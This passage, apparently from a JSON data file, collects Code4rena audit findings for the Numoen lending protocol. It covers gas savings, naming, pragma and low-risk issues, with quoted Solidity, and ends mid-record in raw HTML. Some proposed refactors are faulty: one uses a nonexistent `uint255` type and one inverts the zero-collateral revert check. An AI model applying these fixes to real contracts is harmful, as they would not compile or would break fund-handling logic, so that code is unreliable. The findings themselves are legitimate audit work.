      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Numoen",
      "source_link": "https://code4rena.com/reports/2023-01-numoen",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43337",
      "title": "[G-03]  `keccak256()` should only need to be called on a specific string literal once",
      "impact": "GAS",
      "content": "It should be saved to an immutable variable, and the variable used instead. If the hash is being used as a part of a function selector, the cast to `bytes4` should also only be done once.\n\n*There is 1 instance of this issue:*\n\n```solidity\nFile: src\\libraries\\Balance.sol\n\n13      (bool success, bytes memory data) =\n14        token.staticcall(abi.encodeWithSelector(bytes4(keccak256(bytes(\"balanceOf(address)\"))), address(this)));\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Numoen",
      "source_link": "https://code4rena.com/reports/2023-01-numoen",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43336",
      "title": "[G-02]  Structs can be packed into fewer storage slots",
      "impact": "GAS",
      "content": "Each slot saved can avoid an extra Gsset (**20000 gas**) for the first setting of the struct. Subsequent reads as well as writes have smaller gas savings.\n\n*There are 4 instances of this issue:*\n\n```solidity\nFile: src\\periphery\\LendgineRouter.sol\n\n/// @audit `swapType` can be after `payer`\n74    struct MintCallbackData {\n75      address token0;\n76      address token1;\n77      uint256 token0Exp;\n78      uint256 token1Exp;\n79      uint256 upperBound;\n80      uint256 collateralMax;\n81      SwapType swapType;\n82      bytes swapExtraData;\n83      address payer;\n84    }\n\n/// @audit `swapType` can be after `recipient`\n126   struct MintParams {\n127     address token0;\n128     address token1;\n129     uint256 token0Exp;\n130     uint256 token1Exp;\n131     uint256 upperBound;\n132     uint256 amountIn;\n133     uint256 amountBorrow;\n134     uint256 sharesMin;\n135     SwapType swapType;\n136     bytes swapExtraData;\n137     address recipient;\n138     uint256 deadline;\n139   }\n\n/// @audit `swapType` can be after `recipient`\n175   struct PairMintCallbackData {\n176     address token0;\n177     address token1;\n178     uint256 token0Exp;\n179     uint256 token1Exp;\n180     uint256 upperBound;\n181     uint256 collateralMin;\n182     uint256 amount0Min;\n183     uint256 amount1Min;\n184     SwapType swapType;\n185     bytes swapExtraData;\n186     address recipient;\n187   }\n\n/// @audit `swapType` can be after `recipient`\n240   struct BurnParams {\n241     address token0;\n242     address token1;\n243     uint256 token0Exp;\n244     uint256 token1Exp;\n245     uint256 upperBound;\n246     uint256 shares;\n247     uint256 collateralMin;\n248     uint256 amount0Min;\n249     uint256 amount1Min;\n250     SwapType swapType;\n251     bytes swapExtraData;\n252     address recipient;\n253     uint256 deadline;\n254   }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Numoen",
      "source_link": "https://code4rena.com/reports/2023-01-numoen",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43335",
      "title": "[G-01]  Using `storage` instead of `memory` for structs/arrays saves gas",
      "impact": "GAS",
      "content": "When fetching data from a storage location, assigning the data to a `memory` variable causes all fields of the struct/array to be read from storage, which incurs a Gcoldsload (**2100 gas**) for *each* field of the struct/array. If the fields are read from the new memory variable, they incur an additional `MLOAD` rather than a cheap stack read. Instead of declaring the variable with the `memory` keyword, declaring the variable with the `storage` keyword and caching any fields that need to be re-read in stack variables, will be much cheaper, only incuring the Gcoldsload for the fields actually read. The only time it makes sense to read the whole struct/array into a `memory` variable, is if the full struct/array is being returned by the function, is being passed to a function that requires `memory`, or if the array/struct is being read from another `memory` array/struct.\n\n*There are 2 instances of this issue:*\n\n```solidity\nFile: src\\core\\Lendgine.sol\n\n/// @audit `rewardPerPositionPaid` isn't used\n167     Position.Info memory positionInfo = positions[msg.sender]; // SLOAD\n\n/// @audit `tokensOwed` isn't used\n167     Position.Info memory positionInfo = positions[msg.sender]; // SLOAD\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Numoen",
      "source_link": "https://code4rena.com/reports/2023-01-numoen",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43334",
      "title": "[O-07] PositionMath contains outdated compiler version",
      "impact": "LOW",
      "content": "Using an outdated compiler version can be problematic especially if there are publicly disclosed bugs and issues that affect the current compiler version. It is recommended to use a recent version of the Solidity compiler.\n\nInstance:\n```solidity\nsrc/core/libraries/PositionMath.sol\n```\n\n**[kyscott18 (Numoen) confirmed and commented](https://github.com/code-423n4/2023-01-numoen-findings/issues/259#issuecomment-1424491237):**\n > All the low risk findings have been addressed in other issues so I probably won't change anything in the codebase that I don't have to, but this is a very well written summary of issues.\n\n**[berndartmueller (judge) commented](https://github.com/code-423n4/2023-01-numoen-findings/issues/259#issuecomment-1433359088):**\n > Very well-written and thorough QA report! I agree with all the points mentioned.\n\n\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Numoen",
      "source_link": "https://code4rena.com/reports/2023-01-numoen",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43333",
      "title": "[O-06] Hardcoded values can't be changed",
      "impact": "LOW",
      "content": "The storage variables kink, multiplier and jumpMultiplier all use hardcoded values, which can't be changed in the future.<br>\nAnd these values are the base logic for the calculation of the interest rate curve.\n\nInstance:\n```solidity\nsrc/core/JumpRate.sol\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Numoen",
      "source_link": "https://code4rena.com/reports/2023-01-numoen",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43332",
      "title": "[O-05] Proper use of get as a function name prefix",
      "impact": "LOW",
      "content": "Clear function names can increase readability. Follow a standard convertion function names such as using get for getter (view/pure) functions.\n\nInstances:\n```solidity\nsrc/periphery/UniswapV2/libraries/UniswapV2Library.sol\n\n10: function sortTokens\n\nsrc/periphery/libraries/LendgineAddress.sol\n\n9: function computeAddress\n\nsrc/core/Pair.sol\n\n53: function invariant\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Numoen",
      "source_link": "https://code4rena.com/reports/2023-01-numoen",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43331",
      "title": "[O-04] Function Naming suggestions",
      "impact": "LOW",
      "content": "Proper use of `_` as a function name prefix and a common pattern is to prefix internal and private function names with `_`.<br>\nThis pattern is correctly applied in the Party contracts, however there are some inconsistencies in the libraries.\n\nInstances:\n```solidity\nsrc/periphery/UniswapV2/libraries/UniswapV2Library.sol\n\n10: function sortTokens\n17: function pairFor\n36: function getReserves\n51: function getAmountOut\n69: function getAmountIn\n\nsrc/core/libraries/Position.sol\n\n69: function newTokensOwed\n73: function convertLiquidityToPosition\n86: function convertPositionToLiquidity\n\nsrc/periphery/libraries/LendgineAddress.sol\n\n9: function computeAddress\n\nsrc/libraries/SafeCast.sol\n\n8: function toUint120\n15: function toInt256\n\nsrc/libraries/Balance.sol\n\n12: function balance\n\nsrc/core/libraries/PositionMath.sol\n\n12: function addDelta\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Numoen",
      "source_link": "https://code4rena.com/reports/2023-01-numoen",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43330",
      "title": "[O-03] Events is missing indexed fields",
      "impact": "LOW",
      "content": "Index event fields make the field more quickly accessible to off-chain.<br>\nEach event should use three indexed fields if there are three or more fields.\n\nInstances in:\n```solidity\nsrc/core/Lendgine.sol \n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Numoen",
      "source_link": "https://code4rena.com/reports/2023-01-numoen",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43329",
      "title": "[O-02] Use a more recent pragma version",
      "impact": "LOW",
      "content": "Old version of solidity is used, consider using the new one `0.8.17`.<br>\nYou can see what new versions offer regarding bug fixed [here](https://github.com/ethereum/solidity/blob/develop/Changelog.md).\n\nInstances - All of the contracts.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Numoen",
      "source_link": "https://code4rena.com/reports/2023-01-numoen",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43328",
      "title": "[O-01] Floating pragma",
      "impact": "LOW",
      "content": "Contracts should be deployed with the same compiler version and flags that they have been tested with thoroughly. Locking the pragma helps to ensure that contracts do not accidentally get deployed using, for example, an outdated compiler version that might introduce bugs that affect the contract system negatively.\n\nInstances:\n```solidity\nsrc/core/libraries/Position.sol\nsrc/libraries/SafeCast.sol\nsrc/libraries/Balance.sol\nsrc/core/Pair.sol\nsrc/periphery/SwapHelper.sol\nsrc/periphery/Payment.sol\nsrc/core/JumpRate.sol\nsrc/core/ImmutableState.sol\nsrc/periphery/LendgineRouter.sol\nsrc/periphery/LiquidityManager.sol\nsrc/core/Lendgine.sol\nsrc/core/Factory.sol\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Numoen",
      "source_link": "https://code4rena.com/reports/2023-01-numoen",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43327",
      "title": "[R-04] `2**<n> - 1` can be refactored as `type(uint<n>).max`",
      "impact": "LOW",
      "content": "\n```solidity\nsrc/libraries/SafeCast.sol\n\n15:  function toInt256(uint256 y) internal pure returns (int256 z) {\n16:    require(y < 2 ** 255);\n17:    z = int256(y);\n18:  }\n```\n\nThe above instance can be refactored to:\n\n```solidity\nfunction toInt256(uint256 y) internal pure returns (int256 z) {\n    require(y < type(uint255).max - 1);\n    z = int256(y);\n  }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Numoen",
      "source_link": "https://code4rena.com/reports/2023-01-numoen",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43326",
      "title": "[R-03] Value should be unchecked",
      "impact": "LOW",
      "content": "In the deposit function the storage variable `totalPositionSize` is updated, which represents the total amount of positions issued. Considering the fact the variable is of uint256, an overflow in unrealistic and therefore impossible.\n\n```solidity\nsrc/core/Lendgine.sol\n\n145: totalPositionSize = _totalPositionSize + size;\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Numoen",
      "source_link": "https://code4rena.com/reports/2023-01-numoen",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43325",
      "title": "[R-02] Some number values can be refactored with `_`",
      "impact": "LOW",
      "content": "Consider using underscores for number values to improve readability.\n\n```solidity\nsrc/periphery/UniswapV2/libraries/UniswapV2Library.sol\n\n64: uint256 denominator = (reserveIn * 1000) + amountInWithFee;\n80: uint256 numerator = reserveIn * amountOut * 1000;\n```\n\nThe instances above can be refactored to:\n\n```solidity\n64: uint256 denominator = (reserveIn * 1_000) + amountInWithFee;\n80: uint256 numerator = reserveIn * amountOut * 1_000;\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Numoen",
      "source_link": "https://code4rena.com/reports/2023-01-numoen",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43324",
      "title": "[R-01] `invariant` could just return false if the liquidity is zero",
      "impact": "LOW",
      "content": "In the function `invariant` a check is made, so that the function will revert incase liquidity is zero.<br>\nIf triggered the statement returns `(amount0 == 0 && amount1 == 0)`, so it can revert as inputted amount0 and amount1 can never be zero. Instead of doing all of that a simple false can be applied, so the function can return false and revert.\n\n```solidity\nsrc/core/Pair.sol\n\n53:  function invariant(uint256 amount0, uint256 amount1, uint256 liquidity) public view override returns (bool) {\n54:    if (liquidity == 0) return (amount0 == 0 && amount1 == 0);\n55:\n56:    uint256 scale0 = FullMath.mulDiv(amount0, 1e18, liquidity) * token0Scale;\n57:    uint256 scale1 = FullMath.mulDiv(amount1, 1e18, liquidity) * token1Scale;\n58:\n59:    if (scale1 > 2 * upperBound) revert InvariantError();\n60:\n61:    uint256 a = scale0 * 1e18;\n62:    uint256 b = scale1 * upperBound;\n63:    uint256 c = (scale1 * scale1) / 4;\n64:    uint256 d = upperBound * upperBound;\n65:\n66:    return a + b >= c + d;\n67:  }\n```\n\nThe above instance can be refactored to:\n```solidity\nfunction invariant(uint256 amount0, uint256 amount1, uint256 liquidity) public view override returns (bool) {\n+   if (liquidity == 0) return false;\n\n    uint256 scale0 = FullMath.mulDiv(amount0, 1e18, liquidity) * token0Scale;\n    uint256 scale1 = FullMath.mulDiv(amount1, 1e18, liquidity) * token1Scale;\n\n    if (scale1 > 2 * upperBound) revert InvariantError();\n\n    uint256 a = scale0 * 1e18;\n    uint256 b = scale1 * upperBound;\n    uint256 c = (scale1 * scale1) / 4;\n    uint256 d = upperBound * upperBound;\n\n    return a + b >= c + d;\n  }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Numoen",
      "source_link": "https://code4rena.com/reports/2023-01-numoen",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43323",
      "title": "[N-06] Confusing revert statement",
      "impact": "LOW",
      "content": "The modifier checkDeadline is used on both of the core functions `mint` and `burn`, the main use of the modifier is to check if the block.timestamp crossed the deadline, so the function can revert. A confusing revert name is used in the modifier, users which got the error won't understand the reason why the function reverts.\n\n```solidity\nsrc/periphery/LendgineRouter.sol\n\n65:  modifier checkDeadline(uint256 deadline) {\n66:    if (deadline < block.timestamp) revert LivelinessError();\n67:    _;\n68:  }\n```\n\nChange the revert statement name, so it can be more understandable\n\nExample:\n```solidity\n\nrevert Deadline();\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Numoen",
      "source_link": "https://code4rena.com/reports/2023-01-numoen",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43322",
      "title": "[N-05] Constructor lacks address(0) check",
      "impact": "LOW",
      "content": "Zero-address check should be used in the constructors, to avoid the risk of setting a storage variable as address(0) at deploying time.\n\nInstances:\n```solidity\nsrc/periphery/LiquidityManager.sol\n\n75: constructor(address _factory, address _weth) Payment(_weth) {\n\nsrc/periphery/LendgineRouter.sol\n\n49: constructor\n\nsrc/periphery/Payment.sol\n\n17: constructor(address _weth) {\n\nsrc/periphery/SwapHelper.sol\n\n29: constructor(address _uniswapV2Factory, address _uniswapV3Factory) \n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Numoen",
      "source_link": "https://code4rena.com/reports/2023-01-numoen",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43321",
      "title": "[N-04] Require statements missing strings",
      "impact": "LOW",
      "content": "Require statements should have descriptive strings to describe why the revert occurs.\n\nInstances:\n```solidity\nsrc/periphery/SwapHelper.sol\n\n116: require(amountOutReceived == params.amount);\n\nsrc/libraries/SafeCast.sol\n\n9: require((z = uint120(y)) == y);\n16: require(y < 2 ** 255);\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Numoen",
      "source_link": "https://code4rena.com/reports/2023-01-numoen",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43320",
      "title": "[N-03] Unnecessary if statement applied in the function sweepToken",
      "impact": "LOW",
      "content": "In the function `sweepToken` an if statement is made, which is triggered only if balanceToken is non zero.<br>\nThis if statement is completely unnecessary, as before that another if statement is made to revert if the balance of the contract is below the minimum amount. As the minimum amount is over zero, there is no need for the second if statement after that.\n\n```solidity\nsrc/periphery/Payment.sol\n\n35:  function sweepToken(address token, uint256 amountMinimum, address recipient) public payable {\n36:    uint256 balanceToken = Balance.balance(token);\n37:    if (balanceToken < amountMinimum) revert InsufficientOutputError();\n38:\n39:    if (balanceToken > 0) {\n40:      SafeTransferLib.safeTransfer(token, recipient, balanceToken);\n41:    }\n42:  }\n```\n\nIn the above instance `if (balanceToken > 0)` is not needed and should be removed:\n\n```solidity\nfunction sweepToken(address token, uint256 amountMinimum, address recipient) public payable {\n    uint256 balanceToken = Balance.balance(token);\n    if (balanceToken < amountMinimum) revert InsufficientOutputError();\n\n      SafeTransferLib.safeTransfer(token, recipient, balanceToken);\n  }\n```\n\nOther instance:\n```solidity\nsrc/periphery/Payment.sol\n\n25: function unwrapWETH\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Numoen",
      "source_link": "https://code4rena.com/reports/2023-01-numoen",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43319",
      "title": "[N-02] The check for liquidity in `mint` is unrealistic, as it can never happen",
      "impact": "LOW",
      "content": "In the core function `mint` a check is made to revert in any of the amount collateral, liquidity, shares is zero.<br>\nThe outcome of the liquidity can never be zero, if the collateral is non zero. Considering the fact that first it check if the collateral is zero and revert, the check for the liquidity is unnecessary and can be removed.\n\n```solidity\nsrc/core/Lendgine.sol\n\n71:  function mint(\n72:    address to,\n73:    uint256 collateral,\n74:    bytes calldata data\n75:  )\n76:    external\n77:    override\n78:    nonReentrant\n79:    returns (uint256 shares)\n80:  {\n81:    _accrueInterest();\n82:\n83:    uint256 liquidity = convertCollateralToLiquidity(collateral);\n84:    shares = convertLiquidityToShare(liquidity);\n85:\n86:    if (collateral == 0 || liquidity == 0 || shares == 0) revert InputError();\n```\n\nConsider removing `liquidity == 0` check on L86, as it's unrealistic from occurring:\n\n```solidity\n86:    if (collateral == 0 || shares == 0) revert InputError();\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Numoen",
      "source_link": "https://code4rena.com/reports/2023-01-numoen",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43318",
      "title": "[N-01] The function `collect` should revert incase the collateral is zero",
      "impact": "LOW",
      "content": "The function `collect` is used by user to collect their position interest. As how it's designed the function ignores if the outcome of the collateral is zero and still executes the function. This is problematic considering an event is emitted, the function not reverting on zero collateral will lead to spamming zero values events. Apply a revert statement, so the function will revert instead of simply ignoring it.\n\n```solidity\nsrc/core/Lendgine.sol\n\n194:  function collect(address to, uint256 collateralRequested) external override nonReentrant returns (uint256 collateral) {\n195:    Position.Info storage position = positions[msg.sender]; // SLOAD\n196:    uint256 tokensOwed = position.tokensOwed;\n197:\n198:    collateral = collateralRequested > tokensOwed ? tokensOwed : collateralRequested;\n199:\n200:    if (collateral > 0) {\n201:      position.tokensOwed = tokensOwed - collateral; // SSTORE\n202:      SafeTransferLib.safeTransfer(token1, to, collateral);\n203:    }\n204:\n205:    emit Collect(msg.sender, to, collateral);\n206:  }\n```\n\nRefactor the above instance to:\n\n```solidity\nfunction collect(address to, uint256 collateralRequested) external override nonReentrant returns (uint256 collateral) {\n    Position.Info storage position = positions[msg.sender]; // SLOAD\n    uint256 tokensOwed = position.tokensOwed;\n\n    collateral = collateralRequested > tokensOwed ? tokensOwed : collateralRequested;\n\n    if (collateral > 0) revert ZeroCollater();\n      position.tokensOwed = tokensOwed - collateral; // SSTORE\n      SafeTransferLib.safeTransfer(token1, to, collateral);\n\n    emit Collect(msg.sender, to, collateral);\n  }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Numoen",
      "source_link": "https://code4rena.com/reports/2023-01-numoen",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43317",
      "title": "[L-03] The function `collect` forgets to accrue position interest before the user collects the interest of his position",
      "impact": "LOW",
      "content": "In Lendgine the function `collect` is used by the users to collect the interest that has been gathered to their liquidity position.<br>\nThe problem here occurring is that the function is supposed to accrue both the global interest and the user's liquidity position interest to the current block.timestamp. Note that what l just described is true and it's already applied in a similar function in LiquidityManager - collect(). Consider calling `accruePositionInterest` prior to executing the function `collect`, so the interest can accrued till the current time of the block.timestamp.\n\n```solidity\nsrc/core/Lendgine.sol\n\n194:  function collect(address to, uint256 collateralRequested) external override nonReentrant returns (uint256 collateral) {\n195:    Position.Info storage position = positions[msg.sender]; // SLOAD\n196:    uint256 tokensOwed = position.tokensOwed;\n197:\n198:    collateral = collateralRequested > tokensOwed ? tokensOwed : collateralRequested;\n199:\n200:    if (collateral > 0) {\n201:      position.tokensOwed = tokensOwed - collateral; // SSTORE\n202:      SafeTransferLib.safeTransfer(token1, to, collateral);\n203:    }\n204:\n205:    emit Collect(msg.sender, to, collateral);\n206:  }\n```\n\nYou can see that this is already applied in a similar function:\n\n```solidity\nsrc/periphery/LiquidityManager.sol\n\n230:  function collect(CollectParams calldata params) external payable returns (uint256 amount) {\n231:    ILendgine(params.lendgine).accruePositionInterest();\n232:\n233:    address recipient = params.recipient == address(0) ? address(this) : params.recipient;\n234:\n235:    Position memory position = positions[msg.sender][params.lendgine]; // SLOAD\n236:\n237:    (, uint256 rewardPerPositionPaid,) = ILendgine(params.lendgine).positions(address(this));\n238:    position.tokensOwed += FullMath.mulDiv(position.size, rewardPerPositionPaid - position.rewardPerPositionPaid, 1e18);\n239:    position.rewardPerPositionPaid = rewardPerPositionPaid;\n240:\n241:    amount = params.amountRequested > position.tokensOwed ? position.tokensOwed : params.amountRequested;\n242:    position.tokensOwed -= amount;\n243:\n244:    positions[msg.sender][params.lendgine] = position; // SSTORE\n245:\n246:    uint256 collectAmount = ILendgine(params.lendgine).collect(recipient, amount);\n247:    if (collectAmount != amount) revert CollectError(); // extra check for safety\n248:\n249:    emit Collect(msg.sender, params.lendgine, amount, recipient);\n250:  }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Numoen",
      "source_link": "https://code4rena.com/reports/2023-01-numoen",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43316",
      "title": "[L-02] `refundETH` can be front-run preventing users from getting their eth back",
      "impact": "LOW",
      "content": "The function `refundETH` in Payment.sol is used by users to get their ether back if they send more than the needed amount when using the function `pay`. The problem here is as how the function is designed, any eth values in the contract can be withdrawn by anyone. This bring the risk, where a malicious users can front-run users and successfuly steal their refunds.\n\n```solidity\nsrc/periphery/Payment.sol\n\n44:  function refundETH() external payable {\n45:    if (address(this).balance > 0) SafeTransferLib.safeTransferETH(msg.sender, address(this).balance);\n46:  }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Numoen",
      "source_link": "https://code4rena.com/reports/2023-01-numoen",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "43315",
      "title": "[L-01] Dangerous use of the `burn` function",
      "impact": "LOW",
      "content": "The function `burn` is used by users to burn an option position by minting the required liquidity and unlocking the collateral.<br>\nAs how the function is designed right now in order to do that, the user needs to send his shares to the contract balance.<br>\nThis is simply too risky, as anyone can call the function and basically burn the shares deposited by the users, before they even get the chance to call the function first.\n\nInstead of the need to send the shares to the contract balance, the function can be refactored to check the balance of shares the user posses and to burn them in the moment of execution or on top of that to input a uint value of how many shares the user wants to burn. \n\n```solidity\nsrc/core/Lendgine.sol\n\n105:  function burn(address to, bytes calldata data) external override nonReentrant returns (uint256 collateral) {\n106:    _accrueInterest();\n107:\n108:    uint256 shares = balanceOf[address(this)];\n109:    uint256 liquidity = convertShareToLiquidity(shares);\n110:    collateral = convertLiquidityToCollateral(liquidity);\n111:\n112:    if (collateral == 0 || liquidity == 0 || shares == 0) revert InputError();\n113:\n114:    totalLiquidityBorrowed -= liquidity;\n115:    _burn(address(this), shares);\n116:    SafeTransferLib.safeTransfer(token1, to, collateral); // optimistically transfer\n117:    mint(liquidity, data);\n118:\n119:    emit Burn(msg.sender, collateral, shares, liquidity, to);\n120:  }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Numoen",
      "source_link": "https://code4rena.com/reports/2023-01-numoen",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "6520",
      "title": "[L-04] Minting tokens to the zero address should be avoided",
      "impact": "LOW",
      "content": "The core function `mint` is used by users to mint an option position by providing token1 as collateral and borrowing the max amount of liquidity. Address(0) check is missing in both this function and the internal function `_mint`, which is triggered to mint the tokens to the `to` address. Consider applying a check in the function to ensure tokens aren't minted to the zero address.\n\n```solidity\nsrc/core/Lendgine.sol\n\n71:  function mint(\n72:    address to,\n73:    uint256 collateral,\n74:    bytes calldata data\n75:  )\n76:    external\n77:    override\n78:    nonReentrant\n79:    returns (uint256 shares)\n80:  {\n81:    _accrueInterest();\n82:\n83:    uint256 liquidity = convertCollateralToLiquidity(collateral);\n84:    shares = convertLiquidityToShare(liquidity);\n85:\n86:    if (collateral == 0 || liquidity == 0 || shares == 0) revert InputError();\n87:    if (liquidity > totalLiquidity) revert CompleteUtilizationError();\n88:    // next check is for the case when liquidity is borrowed but then was completely accrued\n89:    if (totalSupply > 0 && totalLiquidityBorrowed == 0) revert CompleteUtilizationError();\n90:\n91:    totalLiquidityBorrowed += liquidity;\n92:    (uint256 amount0, uint256 amount1) = burn(to, liquidity);\n93:    _mint(to, shares);\n94:\n95:    uint256 balanceBefore = Balance.balance(token1);\n96:    IMintCallback(msg.sender).mintCallback(collateral, amount0, amount1, liquidity, data);\n97:    uint256 balanceAfter = Balance.balance(token1);\n98:\n99:    if (balanceAfter < balanceBefore + collateral) revert InsufficientInputError();\n100:\n101:    emit Mint(msg.sender, collateral, shares, liquidity, to);\n102:  }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Numoen",
      "source_link": "https://code4rena.com/reports/2023-01-numoen",
      "github_link": "#l-04-minting-tokens-to-the-zero-address-should-be-avoided",
      "tags": [],
      "finders": []
    },
    {
      "id": "6519",
      "title": "[L-03] The function ",
      "impact": "LOW",
      "content": "<h2 id=\"l-03-the-function-collect-forgets-to-accrue-position-interest-before-the-user-collects-the-interest-of-his-position\" style=\"position:relative;\"><a href=\"#l-03-the-function-collect-forgets-to-accrue-position-interest-before-the-user-collects-the-interest-of-his-position\" aria-label=\"l 03 the function collect forgets to accrue position interest before the user collects the interest of his position permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewbox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[L-03] The function <code>collect</code> forgets to accrue position interest before the user collects the interest of his position</h2>\n<p>In Lendgine the function <code>collect</code> is used by the users to collect the interest that has been gathered to their liquidity position.:br\nThe problem here occurring is that the function is supposed to accrue both the global interest and the user’s liquidity position interest to the current block.timestamp. Note that what l just described is true and it’s already applied in a similar function in LiquidityManager - collect(). Consider calling <code>accruePositionInterest</code> prior to executing the function <code>collect</code>, so the interest can accrued till the current time of the block.timestamp.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"21\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">core</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Lendgine</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">194</span><span class=\"mtk1\">:  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">collect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">to</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collateralRequested</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">nonReentrant</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collateral</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span 